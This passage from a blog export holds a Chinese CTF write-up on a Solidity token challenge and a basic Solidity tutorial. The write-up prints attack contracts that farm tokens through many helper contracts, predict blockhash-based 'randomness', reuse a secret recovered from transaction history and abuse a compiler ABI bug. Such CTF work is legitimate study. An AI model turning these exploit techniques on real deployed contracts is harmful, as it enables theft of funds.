loaned\"); require(scoupon.coupon.amount &lt;= 300, \"loan amount error\"); _loand[scoupon.coupon.buser] = 1; _ebalances[scoupon.coupon.buser] += scoupon.coupon.amount; &#125; function profit() public &#123; require(_profited[msg.sender] == 0); _profited[msg.sender] += 1; _transfer(owner, msg.sender, 1); &#125; function borrow(uint amount) public &#123; require(amount == 1); require(_profited[msg.sender] &lt;= 1); _profited[msg.sender] += 1; _transfer(owner, msg.sender, amount); &#125; function buy(uint amount) public &#123; require(amount &lt;= 300, \"max buy count is 300\"); uint price; uint ethmount = _ebalances[msg.sender]; if (ethmount &lt; 10) &#123; price = 1000000; &#125; else if (ethmount >= 10 &amp;&amp; ethmount &lt;= 233) &#123; price = 10000; &#125; else &#123; price = 1; &#125; uint payment = amount * price; require(payment &lt;= ethmount); _ebalances[msg.sender] -= payment; _transfer(owner, msg.sender, amount); &#125; function sale(uint amount) public &#123; require(_balances[msg.sender] >= amount, \"fail to sale\"); uint earn = amount * tokenprice; _transfer(msg.sender, owner, amount); _ebalances[msg.sender] += earn; &#125; function withdraw() public &#123; require(ethbalances[msg.sender] >= 1); require(_ebalances[msg.sender] >= 1812); payable(msg.sender).call&#123;value:100000000000000000 wei&#125;(\"\"); _ebalances[msg.sender] = 0; _flag[msg.sender] += 1; &#125; /** * @dev See &#123;IERC20-allowance&#125;. */ function allowance(address owner, address spender) public view virtual override returns (uint256) &#123; return _allowances[owner][spender]; &#125; function approve(address spender, uint256 amount) public virtual override returns (bool) &#123; address owner = _msgSender(); _approve(owner, spender, amount); return true; &#125; function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) &#123; require(msg.sender == owner); // 不允许被 owner 以外调用 address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; &#125; function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123; require(msg.sender == owner); // 不允许被 owner 以外调用 address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true; &#125; function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123; require(msg.sender == owner); // 不允许被 owner 以外调用 address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\"); unchecked &#123; _approve(owner, spender, currentAllowance - subtractedValue); &#125; return true; &#125; function _transfer( address from, address to, uint256 amount ) internal virtual &#123; require(from != address(0), \"ERC20: transfer from the zero address\"); require(to != address(0), \"ERC20: transfer to the zero address\"); _beforeTokenTransfer(from, to, amount); uint256 fromBalance = _balances[from]; require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\"); unchecked &#123; _balances[from] = fromBalance - amount; // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by // decrementing then incrementing. _balances[to] += amount; &#125; emit Transfer(from, to, amount); _afterTokenTransfer(from, to, amount); &#125; function _mint(address account, uint256 amount) internal virtual &#123; require(account != address(0), \"ERC20: mint to the zero address\"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked &#123; // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above. _balances[account] += amount; &#125; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount); &#125; function _burn(address account, uint256 amount) internal virtual &#123; require(account != address(0), \"ERC20: burn from the zero address\"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\"); unchecked &#123; _balances[account] = accountBalance - amount; // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply. _totalSupply -= amount; &#125; emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount); &#125; function _approve( address owner, address spender, uint256 amount ) internal virtual &#123; require(owner != address(0), \"ERC20: approve from the zero address\"); require(spender != address(0), \"ERC20: approve to the zero address\"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); &#125; function _spendAllowance( address owner, address spender, uint256 amount ) internal virtual &#123; uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) &#123; require(currentAllowance >= amount, \"ERC20: insufficient allowance\"); unchecked &#123; _approve(owner, spender, currentAllowance - amount); &#125; &#125; &#125; function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual &#123;&#125; function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual &#123;&#125; // debug param secret function get_secret() public view returns (uint) &#123; require(msg.sender == owner); return secret; &#125; // debug param tokenprice function get_price() public view returns (uint) &#123; return tokenprice; &#125; // test need to be delete function testborrowtwice(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 2233); MyToken(this).flashloan(scoupon); &#125; // test need to be delete function set_secret(uint secret_) public onlyowner &#123; secret = secret_; emit changeprice(secret_); &#125;&#125;# 1. 明确目标 这里我们注意到了一个函数 payforflag , 很明显，我们需要调用这一个函数来获得我们的 flag, 那么调用这个函数的条件是什么呢？ function payforflag(string memory mid, string memory b64email) public &#123; require(_flag[msg.sender] == 2); emit sendflag(mid, b64email); &#125;我们需要 _flag[msg.sender] 的值为 2 接下来要做的就是寻找函数使 _flag[msg.sender] 的值到 2. 通过寻找，我们找到了 withdraw 这个函数，而这个函数的执行需要满足两个条件，分别是 ethbalances[msg.sender] &gt;= 1 和 _ebalances[msg.sender] &gt;= 1812 . function withdraw() public &#123; require(ethbalances[msg.sender] >= 1); require(_ebalances[msg.sender] >= 1812); payable(msg.sender).call&#123;value:100000000000000000 wei&#125;(\"\"); _ebalances[msg.sender] = 0; _flag[msg.sender] += 1; &#125;# 第一个条件 先看第一个条件 ethbalances[msg.sender] &gt;= 1 , 我们可以使用 deposit 这个函数来令其满足 function deposit() public &#123; require(_depositd[msg.sender] == 0, \"you can only deposit once\"); _depositd[msg.sender] = 1; ethbalances[msg.sender] += 1; &#125;# 第二个条件 再看第二个条件 _ebalances[msg.sender] &gt;= 1812 , 涉及到该变量的函数有 profit , borrow , buy , sale function profit() public &#123; require(_profited[msg.sender] == 0); _profited[msg.sender] += 1; _transfer(owner, msg.sender, 1); &#125; function borrow(uint amount) public &#123;// 获得 1 个_balances require(amount == 1); require(_profited[msg.sender] &lt;= 1); _profited[msg.sender] += 1; _transfer(owner, msg.sender, amount); &#125; function buy(uint amount) public &#123;// 通过出售_ebalances 购买_balances require(amount &lt;= 300, \"max buy count is 300\"); uint price; uint ethmount = _ebalances[msg.sender]; if (ethmount &lt; 10) &#123; price = 1000000; &#125; else if (ethmount >= 10 &amp;&amp; ethmount &lt;= 233) &#123; price = 10000; &#125; else &#123; price = 1; &#125; uint payment = amount * price; require(payment &lt;= ethmount); _ebalances[msg.sender] -= payment; _transfer(owner, msg.sender, amount); &#125; function sale(uint amount) public &#123;// 通过出售_balances 获得_ebalances require(_balances[msg.sender] >= amount, \"fail to sale\"); uint earn = amount * tokenprice; _transfer(msg.sender, owner, amount); _ebalances[msg.sender] += earn; &#125;我们看看 profit 这个函数，只能运行一次，获得一个 _balances ; 而 borrow 这个函数，一共可以执行两次获得两个 _balances . 但是这两个函数都有 _profited[msg.sender] 这个变量进行限制，也就是说，我们最多只能通过 profit 或 borrow 函数获得 2 个 _balances . 那么 _balances 有什么用呢？看一看 sale 函数，我们可以把 _balances 卖掉得到 _ebalances , 其中 tokenprice 已经被定义为 6 了，所以 _balances 与 _ebalances 之间的兑换比例为 1:6. 而 buy 这个函数，只有当 _ebalances 大于 233 时， _ebalances 与 _balances 之间的兑换比例才是 1:1. 仔细看看上面两段话，稍微思考一下就可以明白，只要我的 _ebalances 比 233 要大，那么不就可以通过与 _balances 互刷的方式不断增加我的 _ebalances 从而满足条件 2 _ebalances[msg.sender] &gt;= 1812 ?! 这里我举个简单的例子，假设我现在有 _ebalances 300 个，那么我可以通过 buy(300) 获得 _balances 300 个，随后在通过 sale(300) 获得 _ebalances 300*6=1800 个，然后再重复上面的过程，那么我的 _ebalances 不久可以源源不断的增加的吗～～～～ 所以我们现在要做的可以是: 获得 _ebalances 大于 233 个 或者 _balances 大于等于 39 个 (因为获得 39 个以上的 _balances 后，可以通过 sale 函数获得的 _ebalances 的数量是 6* _balances , 即 234 个) # 2. 编写攻击合约 在求解这一题的过程中，我想到了两种方法都可以来获得 flag, 接下来听我一一道来～～ # 方法① 我们知道每一个初始账号都可以固定获得 2 个 _balances , 那么我们能否通过小号为大号通过 transfer 方法发送 _balances 的方法获得足够数量的 _balances 呢？答案是可行的. 直接上代码！ 先写一个拿两个 _balances 并转给大号的合约 // SPDX-License-Identifier: MITpragma solidity ^0.8.12;import \"./ctf.sol\";contract mulcreate &#123; MyToken public mytoken; constructor(address _MyTokenAddress) &#123; mytoken = MyToken(_MyTokenAddress); &#125; receive() external payable &#123;&#125; function onestep() public&#123; mytoken.borrow(1); mytoken.borrow(1); mytoken.transfer(adreess(你的主账户地址),2); &#125;&#125;再写一个批量创建合约的合约 // SPDX-License-Identifier: MITpragma solidity ^0.8.12;import \"./create_contract.sol\";contract mulcreate_Factory &#123; mulcreate Mulcreate; function create() external &#123; uint i = 0; for(i=0;i&lt;=20;i=i+1)&#123; Mulcreate = new mulcreate(0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA);// 这个地址就是题目合约的地址 Mulcreate.onestep(); &#125; &#125;&#125;通过调用第二个合约，给大号足够的 _balances 启动资金，就可以开始刷 _ebalances 拿 flag 咯～～ # 方法② 细心的同学在做这题的时候有没有发现这个函数 flashloan , 可以直接给你增加 300 的 _ebalances ! function flashloan(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 0, \"loan key error\"); require(msg.sender == address(this), \"hacker get out\"); Coupon memory coupon = scoupon.coupon; Signature memory sig = scoupon.signature; c=coupon; require(_authd[scoupon.coupon.buser] == 2, \"need pre auth\"); require(_loand[scoupon.coupon.buser] == 0, \"you have already loaned\"); require(scoupon.coupon.amount &lt;= 300, \"loan amount error\"); _loand[scoupon.coupon.buser] = 1; _ebalances[scoupon.coupon.buser] += scoupon.coupon.amount; &#125;不过直接编写攻击合约来调用这个函数肯定是不行滴，因为 require(msg.sender == address(this), &quot;hacker get out&quot;) 这一句的限制了，咋办嘞？ 再找找看叭～～于是我们找到了一个调用 flashloan 的函数 testborrowtwice , 这不就正好可以满足上面的条件了吗～ function testborrowtwice(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 2233); MyToken(this).flashloan(scoupon); &#125; 不过 flashloan 内还有限制条件 require(_authd[scoupon.coupon.buser] == 2, &quot;need pre auth&quot;) , 就是说需要验证的意思，我们找找这两个验证函数 auth1 和 auth2 function auth1(uint pass_) public &#123; require(pass_ == secret, \"auth fail\"); require(_authd[msg.sender] == 0, \"already authd\"); _auth_one[msg.sender] += 1; _authd[msg.sender] += 1; &#125; function auth2(uint pass_) public &#123; uint pass = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); require(pass == pass_, \"password error, auth fail\"); require(_auth_one[msg.sender] == 1, \"need pre auth\"); require(_authd[msg.sender] == 1, \"already authd\"); _authd[msg.sender] += 1; &#125;对于 auth1 , secret 不是直接在 constructor 中有定义了嘛～直接看合约 NICE！一下子就找到了根本难不倒我们～ 但是当你开开心心的把１２３４５６输进去的时候，结果发现居然没通过？？？ 咋回事嘞 再找找看咯 于是你再源码中发现了这个 set_secret ! 没想到 owner 还可以改 secret!! function set_secret(uint secret_) public onlyowner &#123; secret = secret_; emit changeprice(secret_); &#125;这个我们玩区块链的根本不慌滴，区块链的每一笔交易都是有记录的，我们直接去看最早的交易记录. 嘿嘿 这不就有了嘛～ 看看这笔交易的信息 嘿嘿 secret 就是 0x154be90, 转一下十进制就是 22331024, 还挺有寓意的嘛～ 接下来就是搞 auth2 的时候了 function auth2(uint pass_) public &#123; uint pass = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); require(pass == pass_, \"password error, auth fail\"); require(_auth_one[msg.sender] == 1, \"need pre auth\"); require(_authd[msg.sender] == 1, \"already authd\"); _authd[msg.sender] += 1; &#125;当我看到 uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) 这个的时候，我瞬间乐开了花，这我可太熟悉不过了～ 看看这篇文章 Source of Randomness 简直简直就是一个模子里刻出来的哇， uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) 这玩意儿看着随机，其实是确定的！ 接下来写个攻击合约就可以赚到大把大把的 _balances 咯 直接上代码！ // SPDX-License-Identifier: MITpragma solidity ^0.8.12;import \"./ctf.sol\";contract Attack &#123; MyToken public mytoken; constructor(address _MyTokenAddress) &#123;//_MyTokenAddress 是题目的合约地址 mytoken = MyToken(_MyTokenAddress); &#125; receive() external payable &#123;&#125; function attack() public&#123; mytoken.deposit();// 满足 ethbalances [msg.sender] >= 1 mytoken.borrow(1); mytoken.borrow(1);// 得到两个_balances mytoken.auth1(22331024);// 第一个验证 uint answer = uint( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) ); mytoken.auth2(answer);// 第二个验证 SignCoupon memory scoupon; scoupon.coupon.loankey=2233; scoupon.coupon.amount=300; scoupon.coupon.buser=address(this); mytoken.testborrowtwice(scoupon);// 获得_ebalances 300 个 mytoken.buy(302);// 用_ebalances 去换_balances 302 个 mytoken.transfer(adrress(你自己的账户地址),302);// 给你的大号转账_balances 302 个 &#125; function getBalance() public view returns (uint) &#123; return address(this).balance; &#125;&#125;这里简单说明一下为什么将 scoupon.coupon.loankey 赋值为 2233 通过 testborrowtwice 后，在 flashloan 函数中 scoupon.coupon.loankey 又变为 0, 这由于 solidity0.8.12 编译器自身原因导致了这个 bug, 从而使得第一个成员变量的值清零，在 solidity0.8.16 后这个问题得到了修复. 贴一下 bug 描述 \"uid\": \"SOL-2022-6\", \"name\": \"AbiReencodingHeadOverflowWithStaticArrayCleanup\", \"summary\": \"ABI-encoding a tuple with a statically-sized calldata array in the last component would corrupt 32 leading bytes of its first dynamically encoded component.\", \"description\": \"When ABI-encoding a statically-sized calldata array, the compiler always pads the data area to a multiple of 32-bytes and ensures that the padding bytes are zeroed. In some cases, this cleanup used to be performed by always writing exactly 32 bytes, regardless of how many needed to be zeroed. This was done with the assumption that the data that would eventually occupy the area past the end of the array had not yet been written, because the encoder processes tuple components in the order they were given. While this assumption is mostly true, there is an important corner case: dynamically encoded tuple components are stored separately from the statically-sized ones in an area called the *tail* of the encoding and the tail immediately follows the *head*, which is where the statically-sized components are placed. The aforementioned cleanup, if performed for the last component of the head would cross into the tail and overwrite up to 32 bytes of the first component stored there with zeros. The only array type for which the cleanup could actually result in an overwrite were arrays with ``uint256`` or ``bytes32`` as the base element type and in this case the size of the corrupted area was always exactly 32 bytes. The problem affected tuples at any nesting level. This included also structs, which are encoded as tuples in the ABI. Note also that lists of parameters and return values of functions, events and errors are encoded as tuples.\", \"introduced\": \"0.5.8\", \"fixed\": \"0.8.16\", \"severity\": \"medium\", \"conditions\": &#123; \"ABIEncoderV2\": true &#125; # 结语 至此，这第四题区块链的解答就到此结束了 说一说感受吧，每次做区块链的题目都感觉特别有意思，其实本人过去是学习逆向工程的，今年才开始接触区块链，解区块链题目的过程说实话，和逆向分析真的好像哇，都是一个逆向的过程，分析需要满足的条件，然后设法编写合约来让条件得到满足，最终满足所有需要的条件之后获得 flag , 好玩好玩，嘿嘿 (●ˇ∀ˇ●)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"智能合约","slug":"智能合约","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"区块链","slug":"区块链","permalink":"https://oacia.dev/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"}]},{"title":"solidity语言学习","slug":"solidity-learning","date":"2022-10-20T00:19:57.000Z","updated":"2025-04-08T18:55:11.945Z","comments":true,"path":"solidity-learning/","link":"","permalink":"https://oacia.dev/solidity-learning/","excerpt":"","text":"# 前言 过去曾简单接触过 solidity, 合约的内容基本上都是对于函数的调用，感觉和过去看 app 的 java 源码差不多，都是对事件的调用执行。曾经也在 Ropsten 测试网络中进行过几次智能合约的交易，对于交易的过程还是大致有一些了解的，那么我们首先从 solidity 的运行环境开始吧. # 环境配置 这里提供两种配置 solidity 环境的方法 # 通过 Remix 在网页执行 solidity (推荐，方便快捷) Solidity 开发环境搭建 # 通过 visual code 安装 solidity solidity vscode 环境配置 1、安装 vscode、node、git 等； 2、打开 vscode，搜索扩展组建 “solidity + hardhat”，安装； 3、安装 prettier 扩展组建 4、格式化代码设置： “查看” - “命令面板”，输入 setting，点击 Open setting JSON， 增加: \"[solidity]\": &#123; \"editor.defaultFormatter\": \"NomicFoundation.hardhat-solidity\" &#125;, \"[javascript]\":&#123; \"editor.defaultFormatter\": \"esbenp.prettier-vscode\" &#125; \"editor.formatOnSave\": true这样每次保存时，就自动格式化代码； 5、“查看” - “命令面板”，输入 setting，点击 Open User settings, # solidity 的数值类型 solidity 的数值类型有四类，分别是 布尔型 和 c 语言的布尔型类似，solidity 的布尔类型 ( bool ) 也有 true 和 false 两个值 // 布尔值 bool public _bool = true;而布尔型的运算符包括 !(逻辑非) &amp;&amp; (逻辑与，即 and) || (逻辑非，即 or) == (等于) != (不等于) 注意: &amp;&amp; 和 || 运算符遵循的是短路规则，从左到右顺序开始运算，例如有 f(x)||g(y) , 如果 f(x) 的值是 true , 那么 g(y) 的值将会不会被运算， f(x)&amp;&amp;g(y) 也是同理，如果 f(x) 的值是 false , 那么 g(y) 同样不会被计算.(这可以用来节约 gas) 整型 // 整型 int public _int = -1; // 整数，包括负数 uint public _uint = 1; // 正整数 uint256 public _number = 20220330; // 256 位正整数常用的整型运算符包括： 比较运算符（返回布尔值）： &lt;= ， &lt; ， == ， != ， &gt;= ， &gt; 算数运算符： + ， ``， 一元运算 + , - , * , / ， % （取余）， ** （幂） 这里除了幂运算 ( ** ) 和 python 的语法类似，别的整型运算符可以参考 c 语言 地址类型 // 地址 address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71; address payable public _address1 = payable(_address); //payable address，可以转账、查余额 // 地址类型的成员 uint256 public balance = _address1.balance; // balance of address此处的 payable 可以重点关注下，因为 payable address 拥有 balance 和 transfer() 两个成员，简单来说， banlance 用来查询账户的余额，而 transfer() 则可以向一个地址发送以太. 定长字节数组 字节数组 bytes 分两种，一种定长（ byte , bytes8 , bytes32 ），另一种不定长。定长的属于数值类型，不定长的是引用类型。 定长 bytes 可以存一些数据，消耗 gas 比较少。 // 固定长度的字节数组 bytes32 public _byte32 = \"MiniSolidity\"; bytes1 public _byte = _byte32[0];MiniSolidity 变量以字节的方式存储进变量 _byte32 ，转换成 16进制 为： 0x4d696e69536f6c69646974790000000000000000000000000000000000000000 _byte 变量存储 _byte32 的第一个字节，为 0x4d 。 枚举类型 enum // 用 enum 将 uint 0， 1， 2 表示为 Buy, Hold, Sell enum ActionSet &#123; Buy, Hold, Sell &#125; // 创建 enum 变量 action ActionSet action = ActionSet.Buy;# solidity 的函数类型 function &lt;function name> (&lt;parameter types>) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types>)] function 用来声明一个函数，固定用法，这与 python 用 def 来声明一个函数有些类似 &lt;function name&gt; 函数名，自己定 (&lt;parameter types&gt;) 传入函数中的参数 &#123;internal|external|public|private&#125; 说明函数的类型，未标明默认函数类型为 internal . public : 内部外部均可见。(也可用于修饰状态变量，public 变量会自动生成 getter 函数，用于查询数值). private : 只能从本合约内部访问，继承的合约也不能用（也可用于修饰状态变量） external : 只能从合约外部访问（但是可以用 this.f() 来调用， f 是函数名） internal : 只能从合约内部访问，继承的合约可以用（也可用于修饰状态变量) [pure|view|payable] 决定函数权限 / 功能的关键字。带有 payable 的函数可以用来给合约转入 ETH, 而 pure 和 view , 根据 wtf 大佬的说法，是因为 gas fee 的原因，合约的状态变量存储在链上， gas fee 很贵，如果不改变链上状态，就不用付 gas 。包含 pure 跟 view 关键字的函数是不改写链上状态的，因此用户直接调用他们是不需要付 gas 的（合约中 pure / view 函数调用它们则会改写链上状态，需要付 gas）。 在以太坊中，以下语句被视为修改链上状态： 写入状态变量。 释放事件。 创建其他合同。 使用 selfdestruct . 通过调用发送以太币。 调用任何未标记 view 或 pure 的函数。 使用低级调用（low-level calls）。 使用包含某些操作码的内联汇编。 这里总结一下三个关键字的作用 pure 不能读写 view 能读不能写 payable 可以用来交易 [returns ()] 函数返回的变量类型和名称。 # solidity 的函数输出 solidity 支持函数返回多个值，solidity 函数输出的关键字为 return 和 returns returns 加在函数名后面，用于声明返回的变量类型及变量名； return 用于函数主体中，返回指定的变量。 // 返回多个变量 function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123; return(1, true, [uint256(1),2,5]); &#125;当然，solidity 也可以使用命名式返回，示例如下 // 命名式返回 function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; _number = 2; _bool = false; _array = [uint256(3),2,1]; //return (1, true, [uint256 (1),2,5]); 也可以直接用 return 返回值 &#125;# solidity 变量的数据存储类型 solidity 数据存储位置有三类： storage ， memory 和 calldata 。不同存储位置的 gas 成本不同。 storage 类型的数据存在链上，类似计算机的硬盘，消耗 gas 多； memory 和 calldata 类型的临时存在内存里，消耗 gas 少。大致用法： storage ：合约里的状态变量默认都是 storage ，存储在链上。 memory ：函数里的参数和临时变量一般用 memory ，存储在内存中，不上链。 calldata ：和 memory 类似，存储在内存中，不上链。与 memory 的不同点在于 calldata 变量不能修改（ immutable ），一般用于函数的参数。例子： function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123; // 参数为 calldata 数组，不能被修改 //_x [0] = 0 // 这样修改会报错 return(_x); &#125;# 数据位置和赋值规则 storage （合约的状态变量）赋值给本地 storage （函数里的）时候，会创建引用，改变新变量会影响原变量。例子： uint[] x = [1,2,3]; // 状态变量：数组 x function fStorage() public&#123; // 声明一个 storage 的变量 xStorage，指向 x。修改 xStorage 也会影响 x uint[] storage xStorage = x; xStorage[0] = 100; &#125; storage 赋值给 memory ，会创建独立的副本，修改其中一个不会影响另一个；反之亦然。例子： uint[] x = [1,2,3]; // 状态变量：数组 x function fMemory() public view&#123; // 声明一个 Memory 的变量 xMemory，复制 x。修改 xMemory 不会影响 x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300; &#125; memory 赋值给 memory ，会创建引用，改变新变量会影响原变量。 function fMemory2() public returns(uint8[3] memory)&#123; uint8[3] memory x_tmp=[1,2,3]; uint8[3] memory xMemory = x_tmp; xMemory[0] = 100; xMemory[1] = 200; return x_tmp;&#125; 其他情况，变量赋值给 storage ，会创建独立的复本，修改其中一个不会影响另一个。 function fStorage() public returns(uint)&#123; uint xMemory; xMemory=123456; x[0]=xMemory; xMemory=66666666; return x[0]; &#125;# 四种规则的测试代码 //SPDX-License-Identifier:MITpragma solidity ^0.8.7;contract dataStorageRule&#123; uint[] x=[1,2,3]; // 类型为 storage function RuleOne() public returns(uint)&#123; x=[1,2,3]; uint[] storage xstorage = x; xstorage[0]=111; return x[0]; &#125; function Ruletwo() public returns(uint,uint,uint)&#123; x=[1,2,3]; uint[] memory xstorage = x; xstorage[0]=111; xstorage[1]=222; xstorage[2]=333; return (x[0],x[1],x[2]); &#125; function Rulethree() public returns(uint8[3] memory)&#123; uint8[3] memory x_tmp=[1,2,3]; uint8[3] memory xMemory = x_tmp; xMemory[0] = 100; xMemory[1] = 200; return x_tmp; &#125; function Rulefour() public returns(uint)&#123; uint xMemory; xMemory=123456; x[0]=xMemory; xMemory=66666666; return x[0]; &#125;&#125; Ruleone Ruletwo Rulethree Rulefour # 这里用一张关系图来总结一下这四种规则 # 变量的作用域 Solidity 中变量按作用域划分有三种，分别是状态变量（state variable），局部变量（local variable）和全局变量 (global variable) 状态变量 指的是存储在链上的变量，所有合约内的函数都可以访问，定义在合约内，函数外，可以在函数内修改状态变量的值，gas 消耗高. contract Variables &#123; uint public x = 1; uint public y; string public z; 局部变量 存储在内存中，gas 消耗低 function bar() external pure returns(uint)&#123; uint xx = 1; uint yy = 3; uint zz = xx + yy; return(zz); &#125; 全局变量 全局变量是全局范围工作的变量，都是 solidity 预留关键字。他们可以在函数内不声明直接使用 function global() external view returns(address, uint, bytes memory)&#123; address sender = msg.sender; uint blockNum = block.number; bytes memory data = msg.data; return(sender, blockNum, data); &#125;常用的全局变量关键字: blockhash(uint blockNumber) returns (bytes32) ：指定区块的区块哈希 —— 仅可用于最新的 256 个区块且不包括当前区块，否则返回 0 。 block.basefee ( uint ): 当前区块的基础费用，参考： (EIP-3198 和 EIP-1559) block.chainid ( uint ): 当前链 id block.coinbase ( address ): 挖出当前区块的矿工地址 block.difficulty ( uint ): 当前区块难度 block.gaslimit ( uint ): 当前区块 gas 限额 block.number ( uint ): 当前区块号 block.timestamp ( uint ): 自 unix epoch 起始当前区块以秒计的时间戳 gasleft() returns (uint256) ：剩余的 gas msg.data ( bytes ): 完整的 calldata msg.sender ( address ): 消息发送者（当前调用） msg.sig ( bytes4 ): calldata 的前 4 字节（也就是函数标识符） msg.value ( uint ): 随消息发送的 wei 的数量 tx.gasprice ( uint ): 交易的 gas 价格 tx.origin ( address ): 交易发起者（完全的调用链） # solidity 的引用类型 引用类型 (Reference Type)：包括数组（ array ），结构体（ struct ）和映射（ mapping ），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。 # 数组 array 数组（ Array ）是 solidity 常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种： 固定长度数组：在声明时指定数组的长度。用 T[k] 的格式声明，其中 T 是元素的类型， k 是长度，例如： // 固定长度 Array uint[8] array1; bytes1[5] array2; address[100] array3;・可变长度数组（动态数组）：在声明时不指定数组的长度。用 T[] 的格式声明，其中 T 是元素的类型，例如（ **bytes 比较特殊，是数组，但是不用加 [] **）： // 可变长度 Array uint[] array4; bytes1[] array5; address[] array6; bytes array7;# 创建数组的规则 对于 memory 修饰的 动态数组 ，可以用 new 操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子： //memory 动态数组 uint[] memory array8 = new uint[](5); bytes memory array9 = new bytes(9); 数组字面常数 (Array Literals) 是写作表达式形式的数组，用方括号包着来初始化 array 的一种方式，并且里面每一个元素的 type 是以第一个元素为准的，例如 [1,2,3] 里面所有的元素都是 uint8 类型，因为在 solidity 中如果一个值没有指定 type 的话，默认就是最小单位的该 type，这里 int 的默认最小单位类型就是 uint8。而 [uint(1),2,3] 里面的元素都是 uint 类型，因为第一个元素指定了是 uint 类型了，我们都以第一个元素为准。 如果创建的是动态数组，你需要一个一个元素的赋值。 uint[] memory x = new uint[](3); x[0] = 1; x[1] = 3; x[2] = 4;# 数组成员 length : 数组有一个包含元素数量的 length 成员， memory 数组的长度在创建后是固定的。 push() : 动态数组 和 bytes 拥有 push() 成员，可以在数组最后添加一个 0 元素。 push(x) : 动态数组 和 bytes 拥有 push(x) 成员，可以在数组最后添加一个 x 元素。 pop() : 动态数组 和 bytes 拥有 pop() 成员，可以移除数组最后一个元素。 # 结构体 struct 创建一个结构体： // 结构体 struct Student&#123; uint256 id; uint256 score; &#125;初始化一个结构体： Student student; // 初始一个 student 结构体 结构体赋值的两种方法： 方法 1: 在函数中创建一个 storage 的 struct 引用 function initStudent1() external&#123; Student storage _student = student; // assign a copy of student _student.id = 11; _student.score = 100; &#125; 方法 2: 直接引用状态变量的 struct function initStudent2() external&#123; student.id = 1; student.score = 80; &#125;# solidity 中的哈希表：映射类型 (mapping) # 映射 mapping 在映射中，人们可以通过键（ Key ）来查询对应的值（ Value ），比如：通过一个人的 id 来查询他的钱包地址。 声明映射的格式为 mapping(_KeyType =&gt; _ValueType) ，其中 _KeyType 和 _ValueType 分别是 Key 和 Value 的变量类型。例子： mapping(uint => address) public idToAddress; //id 映射到地址 mapping(address => address) public swapPair; // 币对的映射，地址到地址这里用 mapping(uint =&gt; address) public idToAddress 来说明一下映射类型，例如有一个用户他的 id 叫做 oacia , 并且他的钱包地址是 0xABCDEF , 那么我们可以使用如下语句 idToAddress[oacia]=0xABCDEF 这种方式，来将用户 oacia 与他的钱包地址 0xABCDEF 联系起来，下次用户 oacia 再次使用这一个合约时，通过映射 idToAddress 可以马上知道这个用户的钱包地址为 0xABCDEF . # 映射的规则 规则 1：映射的 _KeyType 只能选择 solidity 默认的类型，比如 uint ， address 等，不能用自定义的结构体。而 _ValueType 可以使用自定义的类型。下面这个例子会报错，因为 _KeyType 使用了我们自定义的结构体： // 我们定义一个结构体 Struct struct Student&#123; uint256 id; uint256 score; &#125; mapping(Student => uint) public testVar; 规则 2：映射的存储位置必须是 storage ，因此可以用于合约的状态变量，函数中的 storage 变量，和 library 函数的参数（见例子）。不能用于 public 函数的参数或返回结果中，因为 mapping 记录的是一种关系 (key - value pair)。 规则 3：如果映射声明为 public ，那么 solidity 会自动给你创建一个 getter 函数，可以通过 Key 来查询对应的 Value 。 规则 4：给映射新增的键值对的语法为 _Var[_Key] = _Value ，其中 _Var 是映射变量名， _Key 和 _Value 对应新增的键值对。例子： function writeMap (uint _Key, address _Value) public&#123; idToAddress[_Key] = _Value; &#125;# 映射的原理 原理 1: 映射不储存任何键（ Key ）的资讯，也没有 length 的资讯。 原理 2: 映射使用 keccak256(key) 当成 offset 存取 value。 原理 3: 因为 Ethereum 会定义所有未使用的空间为 0，所以未赋值（ Value ）的键（ Key ）初始值都是 0。 # 变量的初始值 当我们刚定义一个变量并且没有给变量赋值时，solidity 会默认为新定义的变量赋初值，具体如下 # 值类型初始值 boolean : false string : 